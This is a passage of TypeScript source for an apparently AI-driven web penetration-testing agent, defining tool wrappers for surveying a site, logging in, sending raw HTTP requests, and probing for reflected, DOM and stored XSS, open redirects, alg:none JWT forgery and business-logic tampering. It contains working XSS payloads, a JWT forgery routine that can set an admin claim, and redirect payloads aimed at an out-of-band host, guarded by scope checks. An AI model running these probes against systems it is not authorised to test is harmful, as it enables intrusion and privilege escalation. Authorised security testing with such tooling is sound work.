      "browser_fill",
      'Fill a form field by CSS selector (e.g. [name="q"]).',
      { selector: z.string(), value: z.string() },
      async ({ selector, value }) =>
        txt((await s.driver.fill(selector, value)) ? `filled ${selector}` : `could not fill ${selector}`),
    ),
    tool(
      "browser_click",
      "Click an element by CSS selector; returns the resulting page state and any fired APIs.",
      { selector: z.string() },
      async ({ selector }) => {
        const clicked = await s.driver.clickFirst([selector]);
        const fired = s.driver.drainApiCalls();
        const snap = await s.driver.snapshot();
        return txt(
          JSON.stringify({
            clicked,
            url: snap.url,
            title: snap.title,
            forms: snap.forms,
            links: snap.links.slice(0, 40),
            firedApis: fired.map((a) => ({ method: a.method, url: a.url, status: a.status })).slice(0, 30),
          }),
        );
      },
    ),
    tool(
      "survey_status",
      "Report mapping progress: screens discovered so far, how many in-scope links remain unvisited (the frontier), and a sample of those links. Use it to know what is still un-mapped before survey_done.",
      {},
      async () => {
        const screens = s.inv.screens();
        return txt(
          JSON.stringify({
            currentRole: s.currentRole || "unauth",
            rolesAvailable: availableRoles(s),
            screensDiscovered: screens.length,
            screensSample: screens.map((sc) => `${sc.authState === "post-login" ? "🔒" : ""}${sc.urlTemplate}`).slice(0, 40),
            visited: s.visited.size,
            frontierRemaining: s.frontier.size,
            frontier: [...s.frontier].slice(0, 40),
            ignoring: s.ignorePaths,
            exhaustive: s.exhaustive,
          }),
        );
      },
    ),
    tool(
      "ignore_paths",
      "Dynamically prune the survey: mark in-scope path patterns as low-value so they're dropped from the frontier and not mapped further. Use when the frontier keeps growing with the SAME-skeleton content pages that add no new functional/interactive surface (e.g. a CMS article/news tree). `patterns` are path prefixes or globs with `*` (e.g. /artikel/, /news/*, /en/kultur/). A short `reason` is logged. Already-queued matching links are removed immediately; future links matching them are skipped. This does NOT delete already-mapped screens. (No effect when running --exhaustive / full-extraction.)",
      { patterns: z.array(z.string()).min(1), reason: z.string() },
      async ({ patterns, reason }) => {
        if (s.exhaustive)
          return txt("exhaustive mode: ignore is disabled — mapping the full surface. (run without --exhaustive to allow dynamic pruning.)");
        for (const p of patterns) if (p.trim()) s.ignorePaths.push(p.trim());
        let pruned = 0;
        for (const u of [...s.frontier]) {
          if (pathIsIgnored(u, s.ignorePaths, s.targetUrl)) {
            s.frontier.delete(u);
            pruned += 1;
          }
        }
        s.store.appendEvent(s.assessmentId, {
          type: "note",
          payload: { message: `🗑 ignore_paths +[${patterns.join(", ")}]: ${reason.slice(0, 120)} — frontier -${pruned} → ${s.frontier.size}` },
        });
        return txt(JSON.stringify({ ignoring: s.ignorePaths, prunedFromFrontier: pruned, frontierRemaining: s.frontier.size }));
      },
    ),
    tool(
      "survey_done",
      "Finish the SURVEY stage once the frontier is empty and every role's authenticated surface is mapped. Provide a one-line coverage summary.",
      { summary: z.string() },
      async ({ summary }) => {
        // 構造的な認証ゲート: ロールが設定されているのに認証セッションが一度も立っていない
        // (currentCookie も Bearer も空)なら、post-login サーフェスが丸ごと未マップ＝匿名 survey。
        // ここで survey_done を拒否し、各ロールで login() してから完了させる(evidence discipline /
        // screen_done の coverage gate と同じ「省略を構造で防ぐ」思想)。attended の primary も、
        // 手動ログインが実際に cookie を生むまでは未認証扱いになる(currentRole が立つだけでは通さない)。
        const roles = availableRoles(s);
        const authActive = !!(s.currentCookie || s.currentBearer);
        if (!surveyAuthGate(roles.length, authActive).ok) {
          const names = roles.map((r) => (r.description ? `${r.name} (${r.description})` : r.name)).join(", ");
          s.store.appendEvent(s.assessmentId, {
            type: "note",
            payload: { message: `⛔ survey_done refused — ${roles.length} role(s) configured but no authenticated session active; post-login surface unmapped` },
          });
          return txt(
            `survey_done REFUSED — ${roles.length} role(s) are configured (${names}) but no authenticated session is active, so the entire post-login surface is unmapped (this is how a run silently drops from ~60 to ~30 screens). ` +
              `For EACH role: call login(role) — in attended mode this switches to the operator's live session; verify the response shows a cookie/bearer is present — then browser_navigate the authenticated pages it unlocks so they enter the inventory. ` +
              `Only call survey_done again once each role's authenticated surface is mapped. (If a target genuinely has no auth, no roles would be configured and this gate would not apply.)`,
          );
        }
        s.surveyDone = true;
        s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `🗺  SURVEY done: ${summary.slice(0, 300)}` } });
        return txt(`survey complete — ${s.inv.screens().length} screens mapped`);
      },
    ),

    // ───────────────────────── 方法論(STAGE 2) ─────────────────────────
    tool(
      "get_inventory",
      "Return the COMPLETE mapped screen inventory (every screen with its params, APIs, auth state and labels). Basis for the per-screen attack plan.",
      {},
      async () => txt(JSON.stringify({ screens: s.inv.screens().map(screenDigest) })),
    ),
    tool(
      "record_methodology",
      "Record the attack plan for ONE screen: which vulnerability classes apply and concretely how to test them. Call once per screen; every screen must get a plan.",
      { screenId: z.string(), vulnClasses: z.array(z.string()), plan: z.string() },
      async ({ screenId, vulnClasses, plan }) => {
        s.plans.set(screenId, `classes=[${vulnClasses.join(",")}] ${plan}`);
        s.store.appendEvent(s.assessmentId, {
          type: "note",
          payload: { message: `📋 PLAN ${screenId}: [${vulnClasses.join(",")}] ${plan.slice(0, 200)}` },
        });
        return txt(`planned ${screenId} (${s.plans.size}/${s.inv.screens().length} screens planned)`);
      },
    ),
    tool(
      "methodology_done",
      "Finish the METHODOLOGY stage once every screen has a recorded plan.",
      { summary: z.string() },
      async ({ summary }) => {
        s.methodologyDone = true;
        s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `📋 METHODOLOGY done: ${summary.slice(0, 300)}` } });
        return txt(`methodology complete — ${s.plans.size} plans`);
      },
    ),

    // ───────────────────────── 診断(STAGE 3) ─────────────────────────
    tool(
      "get_screen",
      "Return the screen currently under diagnosis: its full detail, its planned checks, the roles available, and known object ids seen on other screens (for cross-user access-control tests).",
      { screenId: z.string().optional() },
      async ({ screenId }) => {
        const id = screenId ?? s.currentScreenId;
        const sc = s.inv.screens().find((x) => x.screenId === id);
        if (!sc) return txt(`no screen '${id}'`);
        return txt(
          JSON.stringify({
            screen: { ...screenDigest(sc), observedUrls: sc.observedUrls.slice(0, 6), description: sc.description },
            plan: s.plans.get(sc.screenId) ?? "(no recorded plan — use judgement)",
            // 必ず潰すチェックリスト。screen_done は各クラスの coverage を要求する(1個見つけて打ち切るのを防ぐ)。
            plannedClasses: plannedClassesFor(s.plans.get(sc.screenId)),
            currentRole: s.currentRole || "unauth",
            rolesAvailable: availableRoles(s),
            knownObjectIds: knownObjectIds(s),
            alreadyConfirmed: [...s.findingsByKey.keys()],
          }),
        );
      },
    ),
    tool(
      "http_request",
      "Send a scoped raw HTTP request to probe a hypothesis (IDOR/auth/exposure). Uses the current login session. Records evidence; returns an evidenceId to cite in findings.",
      {
        method: z.string(),
        url: z.string(),
        headers: z.record(z.string()).optional(),
        body: z.string().optional(),
        note: z.string().optional(),
      },
      async ({ method, url, headers, body, note }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        const req: HttpRequest = {
          method: method.toUpperCase(),
          url,
          headers: { ...authHeaders(s), ...(headers ?? {}) },
          body: body ?? null,
        };
        let res: HttpResponse;
        try {
          res = await s.http.send(req);
          bumpHttp(s, res.status);
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 200)}`);
        }
        const ev = s.evidence.record({
          screenId: s.currentScreenId ?? "pilot",
          validator: "claude-pilot",
          kind: "positive_replay",
          request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, // 送信ヘッダ全部を証拠に残す
          response: res,
          note: note ?? `${req.method} ${url} as ${s.currentRole || "unauth"}`,
        });
        return txt(
          JSON.stringify({
            evidenceId: ev.id,
            status: res.status,
            headers: pick(res.headers, ["content-type", "location", "set-cookie", "www-authenticate", "access-control-allow-origin"]),
            bodyLength: res.body.length,
            body: res.body.slice(0, 1800),
          }),
        );
      },
    ),
    tool(
      "login",
      "Log in as one of the provided roles to reach authenticated surface. Updates the browser + http session to that role.",
      { role: z.string() },
      async ({ role }) => {
        const desc = s.roleDescriptions.get(role);
        const tag = desc ? ` [${desc}]` : ""; // 権限説明(あれば)を応答に添える
        // ⓪ attended(手動マルチセッション): ロールごとに既に生きたコンテキストがある。
        //    ログインし直さず、アクティブな driver / cookie をそのロールへ swap するだけ。
        const live = s.roleSessions?.get(role);
        if (live) {
          s.driver = live.driver;
          const fresh = await live.driver.sessionCookieHeader().catch(() => live.cookie);
          if (fresh) live.cookie = fresh;
          s.currentCookie = live.cookie;
          s.currentBearer = (await live.driver.bearerToken().catch(() => null)) ?? "";
          s.currentRole = role;
          return txt(`switched to live attended session for role '${role}'${tag} (manual login; cookie ${live.cookie ? "present" : "empty"}${s.currentBearer ? ", bearer present" : ""}).`);
        }
        // ① 事前取得 Cookie ファイルがあれば、ログインせずに注入(自動ログイン不能な壁向け)。
        const cookieFile = s.roleCookieFiles.get(role);
        if (cookieFile) {
          try {
            const { header, browserCookies } = loadCookieFile(cookieFile, s.targetUrl);
            if (!header) return txt(`cookie file for '${role}' is empty/unparseable: ${cookieFile}`);
            await s.driver.clearSession();
            await s.driver.addCookies(browserCookies);
            s.currentCookie = header;
            s.currentBearer = (await s.driver.bearerToken().catch(() => null)) ?? "";
            s.currentRole = role;
            return txt(`role '${role}'${tag}: injected ${browserCookies.length} pre-captured cookie(s) from file (no login).`);
          } catch (e) {
            return txt(`cookie file error for '${role}': ${String(e).slice(0, 150)}`);
          }
        }
        // ② 資格情報で smartLogin。
        const creds = s.roleCreds.get(role);
        if (!creds) {
          const avail = availableRoles(s).map((r) => (r.description ? `${r.name} (${r.description})` : r.name)).join(", ") || "none";
          return txt(`no credentials/cookie for '${role}'. Available roles: ${avail}`);
        }
        try {
          await s.driver.clearSession();
          const r = await smartLogin(s.driver, s.loginLlm, creds, {
            targetUrl: s.targetUrl,
            ...(s.model ? { model: s.model } : {}),
          });
          if (r.ok) {
            s.currentCookie = await s.driver.sessionCookieHeader();
            s.currentBearer = (await s.driver.bearerToken().catch(() => null)) ?? "";
            s.currentRole = role;
            return txt(`logged in as '${role}'${tag}; now at ${s.driver.currentUrl()}${s.currentBearer ? " (bearer JWT captured)" : ""}`);
          }
          return txt(`login as '${role}' did not complete: ${r.reason}`);
        } catch (e) {
          return txt(`login error: ${String(e).slice(0, 200)}`);
        }
      },
    ),
    tool(
      "probe_xss",
      "Confirm REFLECTED XSS: injects a unique marker into `param` and checks the HTML response reflects it UNESCAPED (the literal <tag> comes back, not &lt;tag&gt;). Sends a benign control (no tag) + a breakout payload twice. Returns negativeControl + positiveReplays evidenceIds + the effectMarker, ready for record_finding(category xss-reflected). Default = GET query-param reflection; pass a `body` containing {{XSS}} (and method/url) to test a body field. NOTE: confirms unescaped HTML reflection (high-signal first-order XSS); not proof of execution.",
      { url: z.string(), param: z.string().optional(), method: z.string().optional(), body: z.string().optional() },
      async ({ url, param, method, body }) => {
        const tok = `xZ${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
        const marker = `<xss${tok}>`; // 未エスケープで返れば HTML パース文脈に注入できている
        const send = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
          let u = url;
          let b: string | null = null;
          if (body != null) b = body.replace(/\{\{XSS\}\}/g, val);
          else if (param) {
            try {
              const uu = new URL(url);
              uu.searchParams.set(param, val);
              u = uu.toString();
            } catch {
              return null;
            }
          }
          if (!isInScope(u, s.scope)) throw new Error(`out of scope: ${u}`);
          const req: HttpRequest = { method: (method ?? (body != null ? "POST" : "GET")).toUpperCase(), url: u, headers: authHeaders(s), body: b };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-xss",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: `xss ${tag} ${param ?? "body"}`,
          });
          return { evId: ev.id, status: res.status, raw: res.body.includes(marker), html: /html/i.test(res.headers["content-type"] ?? "") };
        };
        let ctrl: Awaited<ReturnType<typeof send>>;
        let p1: Awaited<ReturnType<typeof send>>;
        let p2: Awaited<ReturnType<typeof send>>;
        try {
          ctrl = await send(`xss${tok}`, "negative_control", "control(benign, no tag)");
          p1 = await send(`"><xss${tok}>`, "positive_replay", "payload #1");
          p2 = await send(`"><xss${tok}>`, "positive_replay", "payload #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
        if (!ctrl || !p1 || !p2) return txt("ERROR: could not build request (bad url/param — pass a valid url + param or a body with {{XSS}})");
        const verdict = checkLogicEvidence(
          { status: ctrl.status, hasMarker: ctrl.raw },
          [p1, p2].map((p) => ({ status: p.status, hasMarker: p.raw })),
        );
        const htmlCtx = p1.html && p2.html;
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [p1.evId, p2.evId],
            effectMarker: marker,
            control: { reflectedUnescaped: ctrl.raw },
            payload: [{ reflectedUnescaped: p1.raw, htmlResponse: p1.html }, { reflectedUnescaped: p2.raw, htmlResponse: p2.html }],
            verdict: verdict.ok
              ? htmlCtx
                ? "REFLECTED XSS — payload reflected UNESCAPED in an HTML response; record_finding(xss-reflected) with these evidenceIds + effectMarker"
                : "payload reflected unescaped but response is NOT html content-type — likely not browser-executable; verify the sink before recording"
              : `not confirmed: ${(verdict as { reason: string }).reason}`,
          }),
        );
      },
    ),
    tool(
      "probe_dom_xss",
      "Confirm DOM-based / innerHTML-sink XSS by ACTUAL BROWSER EXECUTION — what probe_xss CANNOT see (probe_xss only checks HTTP-response reflection, so it misses client-rendered SPA sinks: a search box that renders `q` into innerHTML, e.g. Juice Shop `#/search?q=`, returns JSON/SPA-shell from the server and executes only in the browser). Navigates a real browser to the injection point with an executing payload and reports whether it RAN. Pass `url` with a `{{XSS}}` placeholder at the injection point (best — also works for hash routes), or `url` + `param` (the query/hash param to inject). Sends a benign control (no payload) + the payload twice; returns negativeControl + positiveReplays evidenceIds + effectMarker, ready for record_finding(category xss-reflected). USE THIS whenever probe_xss came back 'reflected but NOT html' / 'not confirmed' on a client-rendered or SPA route.",
      { url: z.string(), param: z.string().optional() },
      async ({ url, param }) => {
        const tok = `domX${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
        // 実行時に window.__amraam_xss=tok を立て、alert でも出す(どちらか1つでも検出)。img.onerror は innerHTML 挿入で発火。
        const payload = `"><img src=x onerror="window.__amraam_xss='${tok}';alert('${tok}')">`;
        const benign = `amraam${tok}safe`;
        const buildUrl = (val: string): string | null => {
          try {
            if (url.includes("{{XSS}}")) return url.replace(/\{\{XSS\}\}/g, encodeURIComponent(val));
            if (!param) return null;
            // ハッシュルート対応: '#…' があればハッシュ側のクエリへ注入(URL API は hash 内を触らないため手で組む)。
            const hashAt = url.indexOf("#");
            if (hashAt >= 0) {
              const base = url.slice(0, hashAt);
              let hash = url.slice(hashAt); // 例 '#/search?q=…'
              const enc = `${encodeURIComponent(param)}=${encodeURIComponent(val)}`;
              const re = new RegExp(`([?&]${param}=)[^&]*`);
              if (hash.includes("?")) hash = re.test(hash) ? hash.replace(re, `$1${encodeURIComponent(val)}`) : `${hash}&${enc}`;
              else hash = `${hash}?${enc}`;
              return base + hash;
            }
            const uu = new URL(url);
            uu.searchParams.set(param, val);
            return uu.toString();
          } catch {
            return null;
          }
        };
        const run = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
          const u = buildUrl(val);
          if (!u) return null;
          if (!isInScope(u, s.scope)) throw new Error(`out of scope: ${u}`);
          const r = await s.driver.detectXssExecution(u, tok);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-dom-xss",
            kind,
            request: { method: "GET", url: u, headers: {}, body: null },
            // 実行結果を body に符号化(executed のとき tok を含む)→ record_finding のマーカーゲートに乗る。
            response: { status: 200, finalUrl: u, durationMs: 0, headers: { "content-type": "text/html" }, body: r.executed ? `${r.signal} [${tok}]` : r.signal },
            note: `dom-xss ${tag}`,
          });
          return { evId: ev.id, executed: r.executed, signal: r.signal };
        };
        let ctrl: Awaited<ReturnType<typeof run>>;
        let p1: Awaited<ReturnType<typeof run>>;
        let p2: Awaited<ReturnType<typeof run>>;
        try {
          ctrl = await run(benign, "negative_control", "control(benign, no payload)");
          p1 = await run(payload, "positive_replay", "payload #1");
          p2 = await run(payload, "positive_replay", "payload #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
        if (!ctrl || !p1 || !p2) return txt("ERROR: could not build injection URL — pass url with a {{XSS}} placeholder, or url + param.");
        const confirmed = !ctrl.executed && p1.executed && p2.executed;
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [p1.evId, p2.evId],
            effectMarker: tok,
            control: { executed: ctrl.executed },
            payload: [{ executed: p1.executed, signal: p1.signal }, { executed: p2.executed, signal: p2.signal }],
            verdict: confirmed
              ? "DOM XSS CONFIRMED — payload EXECUTED in the browser (control did not). record_finding(xss-reflected) with these evidenceIds + effectMarker."
              : ctrl.executed
                ? "inconclusive: the benign control also 'executed' — detection is unreliable here, do not record."
                : "not confirmed: payload did not execute in the browser (the sink escapes it or is not a live DOM sink).",
          }),
        );
      },
    ),
    tool(
      "probe_redirect",
      "Confirm an OPEN REDIRECT: sets `param` to an attacker-controlled external host and checks the response redirects there (Location header → the OOB host). Sends a benign in-scope control + the external payload twice. Returns negativeControl + positiveReplays evidenceIds + the effectMarker (the OOB host), ready for record_finding(category open-redirect).",
      { url: z.string(), param: z.string() },
      async ({ url, param }) => {
        const marker = OOB_MARKER;
        const send = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
          let u: string;
          try {
            const uu = new URL(url);
            uu.searchParams.set(param, val);
            u = uu.toString();
          } catch {
            return null;
          }
          if (!isInScope(u, s.scope)) throw new Error(`out of scope: ${u}`);
          const req: HttpRequest = { method: "GET", url: u, headers: authHeaders(s), body: null };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const loc = res.headers["location"] ?? "";
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-redirect",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: `redirect ${tag} ${param}`,
          });
          return { evId: ev.id, status: res.status, toOob: loc.includes(marker), location: loc.slice(0, 200) };
        };
        let ctrl: Awaited<ReturnType<typeof send>>;
        let p1: Awaited<ReturnType<typeof send>>;
        let p2: Awaited<ReturnType<typeof send>>;
        try {
          ctrl = await send("/account", "negative_control", "control(in-scope path)");
          p1 = await send(`https://${marker}/`, "positive_replay", "payload #1");
          p2 = await send(`https://${marker}/`, "positive_replay", "payload #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
        if (!ctrl || !p1 || !p2) return txt("ERROR: could not build request (bad url/param)");
        const verdict = checkLogicEvidence(
          { status: ctrl.status, hasMarker: ctrl.toOob },
          [p1, p2].map((p) => ({ status: p.status, hasMarker: p.toOob })),
        );
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [p1.evId, p2.evId],
            effectMarker: marker,
            control: { location: ctrl.location, toOob: ctrl.toOob },
            payload: [{ location: p1.location, toOob: p1.toOob }, { location: p2.location, toOob: p2.toOob }],
            verdict: verdict.ok
              ? "OPEN REDIRECT — Location points to the attacker-controlled OOB host; record_finding(open-redirect) with these evidenceIds + effectMarker"
              : `not confirmed: ${(verdict as { reason: string }).reason}`,
          }),
        );
      },
    ),
    tool(
      "probe_jwt",
      "Confirm a JWT signature-verification bypass (alg:none forgery). Requires the current session to hold a Bearer JWT (login first). Forges an alg:none token from it (empty signature) and replays it against an identity-returning authed `url`; sends a garbage token as the negative control (must be rejected) and the forged token twice (if accepted = the server does not verify the signature). Returns negativeControl + positiveReplays evidenceIds for record_finding(category session). Optionally mutate a claim via `claimKey`/`claimValue` to also prove privilege escalation.",
      { url: z.string(), claimKey: z.string().optional(), claimValue: z.string().optional() },
      async ({ url, claimKey, claimValue }) => {
        if (!s.currentBearer) return txt("no Bearer JWT in the current session — login(role) first (this probe forges from the live token).");
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        const forged = forgeAlgNone(s.currentBearer, claimKey ? (c) => { c[claimKey] = claimValue ?? "admin"; } : undefined);
        if (!forged) return txt("could not parse the current Bearer token as a JWT (header.payload.signature).");
        const send = async (bearer: string, kind: "negative_control" | "positive_replay", tag: string) => {
          const req: HttpRequest = { method: "GET", url, headers: { ...authHeaders(s), authorization: `Bearer ${bearer}` }, body: null };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-jwt",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: `jwt ${tag}`,
          });
          return { evId: ev.id, status: res.status, len: res.body.length };
        };
        let ctrl: Awaited<ReturnType<typeof send>>;
        let p1: Awaited<ReturnType<typeof send>>;
        let p2: Awaited<ReturnType<typeof send>>;
        try {
          ctrl = await send("eyJhbGciOiJub25lIn0.eyJpbnZhbGlkIjp0cnVlfQ.", "negative_control", "garbage/invalid token"); // 明らかに無効 → 401 が期待
          p1 = await send(forged, "positive_replay", "forged alg:none #1");
          p2 = await send(forged, "positive_replay", "forged alg:none #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
        const accepted = p1.status < 400 && p2.status < 400 && ctrl.status >= 400;
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [p1.evId, p2.evId],
            control: { status: ctrl.status },
            forged: [{ status: p1.status }, { status: p2.status }],
            verdict: accepted
              ? "JWT FORGERY — the alg:none token was ACCEPTED while the garbage control was rejected; the server does not verify the signature. record_finding(session, severity high/critical) with these evidenceIds."
              : `not confirmed: forged token status ${p1.status}/${p2.status}, control ${ctrl.status} (need forged<400 and control>=400)`,
          }),
        );
      },
    ),
    tool(
      "probe_logic",
      'Confirm a BUSINESS-LOGIC flaw by differential test: sends a BASELINE (legitimate) request once and a MUTATED (manipulated) request twice, and checks whether the server ACCEPTED the manipulation via `effectMarker` — a string that appears in the response ONLY when the manipulation took effect (e.g. the injected price/total, "role":"admin", an out-of-order step succeeding). Use for price/quantity tampering, mass-assignment (extra role/isAdmin field in the body), workflow/step skipping. Returns evidenceIds (baseline=negativeControl, mutated=positiveReplays) ready for record_finding.',
      {
        baseline: z.object({ method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional() }),
        mutated: z.object({ method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional() }),
        effectMarker: z.string(),
        note: z.string().optional(),
      },
      async ({ baseline, mutated, effectMarker, note }) => {
        for (const u of [baseline.url, mutated.url]) if (!isInScope(u, s.scope)) return txt(`BLOCKED: ${u} is out of scope`);
        const mkReq = (r: { method: string; url: string; headers?: Record<string, string>; body?: string | null }): HttpRequest => ({
          method: r.method.toUpperCase(),
          url: r.url,
          headers: { ...authHeaders(s), ...(r.headers ?? {}) },
          body: r.body ?? null,
        });
        const fire = async (req: HttpRequest, kind: "negative_control" | "positive_replay", tag: string) => {
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-logic",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: note ? `${note} (${tag})` : tag,
          });
          return { evId: ev.id, status: res.status, len: res.body.length, hasMarker: res.body.includes(effectMarker) };
        };
        let baseO: Awaited<ReturnType<typeof fire>>;
        let mut1: Awaited<ReturnType<typeof fire>>;
        let mut2: Awaited<ReturnType<typeof fire>>;
        try {
          baseO = await fire(mkReq(baseline), "negative_control", "baseline (legit)");
          mut1 = await fire(mkReq(mutated), "positive_replay", "mutated #1");
          mut2 = await fire(mkReq(mutated), "positive_replay", "mutated #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 150)}`);
        }
        const verdict = checkLogicEvidence(
          { status: baseO.status, hasMarker: baseO.hasMarker },
          [mut1, mut2].map((m) => ({ status: m.status, hasMarker: m.hasMarker })),
        );
        return txt(
          JSON.stringify({
            negativeControl: baseO.evId,
            positiveReplays: [mut1.evId, mut2.evId],
            baseline: { status: baseO.status, len: baseO.len, marker: baseO.hasMarker },
            mutated: [
              { status: mut1.status, len: mut1.len, marker: mut1.hasMarker },
              { status: mut2.status, len: mut2.len, marker: mut2.hasMarker },
            ],
            verdict: verdict.ok ? "MANIPULATION ACCEPTED — record_finding with these evidenceIds + effectMarker" : `not confirmed: ${(verdict as { reason: string }).reason}`,
          }),
        );
      },
    ),
    tool(
      "probe_stored_xss",
      "Confirm STORED / cross-context XSS: injects a marker payload at a STORE point (a request that PERSISTS input — comment, profile, filename, ticket, review) then reads it back at a RENDER point to see if it comes back UNESCAPED (or EXECUTES in a browser). The render point can be a DIFFERENT endpoint/screen and can be viewed AS ANOTHER ROLE (`renderAsRole`) to prove cross-user stored XSS (store as the attacker, it fires in a victim/admin view). `store`: {method,url,headers?,body?} with a {{XSS}} placeholder where the input lands. `renderUrl`: where to read it back (GET). Set `renderBrowser:true` to drive a real browser at renderUrl and detect ACTUAL execution (client-rendered stores). Returns negativeControl + positiveReplays evidenceIds + effectMarker, ready for record_finding(category xss-stored).",
      {
        store: z.object({ method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional() }),
        renderUrl: z.string(),
        renderBrowser: z.boolean().optional(),
        renderAsRole: z.string().optional(),
      },
      async ({ store, renderUrl, renderBrowser, renderAsRole }) => {
        const tok = `stoX${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
        const payload = `"><img src=x onerror="window.__amraam_xss='${tok}'">`;
        const benign = `amraam${tok}safe`;
        const sig = `onerror="window.__amraam_xss='${tok}'"`; // HTTP 反映の確証= 未エスケープのこの片が render に出ること
        const effectMarker = renderBrowser ? tok : sig; // ブラウザ実行なら tok、HTTP 反映なら未エスケープ片
        if (!isInScope(store.url, s.scope) || !isInScope(renderUrl, s.scope)) return txt("BLOCKED: store/render url out of scope");
        // render を別ロールで覗く(cross-user stored XSS の確証)。roleSessions に無ければ現在のセッションのまま。
        let renderHeaders: Record<string, string> = authHeaders(s);
        if (renderAsRole) {
          const live = s.roleSessions?.get(renderAsRole);
          if (live) {
            const ck = await live.driver.sessionCookieHeader().catch(() => live.cookie);
            const bt = await live.driver.bearerToken().catch(() => null);
            renderHeaders = { ...(ck ? { cookie: ck } : {}), ...(bt ? { authorization: `Bearer ${bt}` } : {}) };
          }
        }
        const doStore = async (val: string): Promise<number> => {
          const body = store.body != null ? store.body.replace(/\{\{XSS\}\}/g, val) : null;
          const u = store.url.replace(/\{\{XSS\}\}/g, encodeURIComponent(val));
          const req: HttpRequest = { method: store.method.toUpperCase(), url: u, headers: { ...authHeaders(s), ...(store.headers ?? {}) }, body };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          return res.status;
        };
        const render = async (kind: "negative_control" | "positive_replay", tag: string): Promise<{ evId: string; status: number; has: boolean }> => {
          if (renderBrowser) {
            const r = await s.driver.detectXssExecution(renderUrl, tok);
            const ev = s.evidence.record({
              screenId: s.currentScreenId ?? "pilot",
              validator: "claude-pilot-stored-xss",
              kind,
              request: { method: "GET", url: renderUrl, headers: {}, body: null },
              response: { status: 200, finalUrl: renderUrl, durationMs: 0, headers: { "content-type": "text/html" }, body: r.executed ? `${r.signal} [${tok}]` : r.signal },
              note: `stored-xss browser ${tag}`,
            });
            return { evId: ev.id, status: 200, has: r.executed };
          }
          const req: HttpRequest = { method: "GET", url: renderUrl, headers: renderHeaders, body: null };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-stored-xss",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: `stored-xss render ${tag}`,
          });
          return { evId: ev.id, status: res.status, has: res.body.includes(sig) };
        };
        let ctrl: Awaited<ReturnType<typeof render>>;
        let p1: Awaited<ReturnType<typeof render>>;
        let p2: Awaited<ReturnType<typeof render>>;
        try {
          await doStore(benign);
          ctrl = await render("negative_control", "control(benign stored)");
          await doStore(payload);
          p1 = await render("positive_replay", "payload read #1");
          p2 = await render("positive_replay", "payload read #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 160)}`);
        }
        const confirmed = !ctrl.has && p1.has && p2.has;
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [p1.evId, p2.evId],
            effectMarker,
            renderedAs: renderAsRole ?? s.currentRole ?? "current session",
            mode: renderBrowser ? "browser-execution" : "http-reflection",
            control: { fired: ctrl.has },
            payload: [{ fired: p1.has }, { fired: p2.has }],
            verdict: confirmed
              ? `STORED XSS — the payload ${renderBrowser ? "EXECUTED in the browser" : "came back UNESCAPED"} at the render point (control clean)${renderAsRole ? ` viewed as role '${renderAsRole}' (cross-user)` : ""}. record_finding(xss-stored) with these evidenceIds + effectMarker.`
              : "not confirmed: the payload did not persist + fire at the render point (escaped, not stored, or not rendered there).",
          }),
        );
      },
    ),
    tool(
      "probe_csrf",
